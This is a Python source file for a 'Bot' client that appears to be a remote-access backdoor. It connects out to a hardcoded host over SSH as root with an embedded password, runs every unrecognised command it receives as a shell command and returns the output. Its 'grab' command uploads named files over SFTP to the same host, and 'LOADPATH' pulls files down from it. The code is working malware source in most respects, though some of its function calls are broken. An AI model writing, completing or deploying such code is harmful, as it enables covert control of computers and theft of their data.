from paramiko import Transport
from paramiko import SFTPClient
from paramiko import SSHClient
from paramiko import AutoAddPolicy
from threading import  Thread
from  subprocess import Popen
from  subprocess import PIPE

import  paramiko
import ChannelSSH
import os
import logging
logging.basicConfig()
duper_lp= "./android_dm.cnf"
class Bot():
    def __init__(self):
        self.path_source = None
        self.path_destination = None


    def getOutputCmd(self,cmd):
        # do shell command
        try:
            proc = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
            # read output
            stdout_value = proc.stdout.read() + proc.stderr.read()
            return stdout_value
        except:
            pass

    def dump_db(self):
        try:
            transport = Transport(('192.168.43.99', 222))
            transport.connect(username='dumper', password='dontgiveafuck')
            sftp_client = SFTPClient.from_transport(transport)
            sftp_client.put(self.path, '/home/roughiz/tmp/test/' +self.path)
            sftp_client.close()
            transport.close()
        except:
            pass
    def get_dumper_file(self):
        try:
            transport = Transport(('192.168.43.99', 222))
            #mykey = paramiko.RSAKey(key=myprivatekey)
            privatekeyfile = os.path.expanduser('./bot_keys/id_rsa')
            mykey = paramiko.RSAKey.from_private_key_file(privatekeyfile)
            transport.connect(username='bot',pkey = mykey)
            sftp_client = SFTPClient.from_transport(transport)
            sftp_client.get(self.path_source, duper_lp, callback=None)
            sftp_client.close()
            transport.close()
        except Exception, e:
            print "Fct:Dumper file import: "+str(e)


    def connect(self):
        subRoot = None
        client = SSHClient()
        client.set_missing_host_key_policy(AutoAddPolicy())
        client.connect('192.168.43.99',port=2222, username='root', password='thetoorpassword')
        chan = client.get_transport().open_session()
        while True:
            command = ChannelSSH.receiveFromChannel(chan)
            if 'deconnect' in command:
                ChannelSSH.closeChannel(chan)
                break
            elif 'grab' in command:
                try:
                    blah, path = command.split('*')
                except:
                    ChannelSSH.sendToChannel('[-]command syntax error',chan)
                Thread(target=self.dump_db, args=(path,)).start()
                ChannelSSH.sendToChannel('[+]Starting SFTP Function',chan)
            elif 'LOADPATH' in command:
                inita, path_d,path_s = command.split(';')
                self.path_source = path_s
                self.path_destination = path_d
                print ("ps:"+self.path_source+"--- path dest"+self.path_destination)
                self.get_dumper_file()
            else:
                ChannelSSH.sendToChannel(self.getOutputCmd(command),chan)


if __name__ == '__main__':
    bot = Bot()
    bot.connect()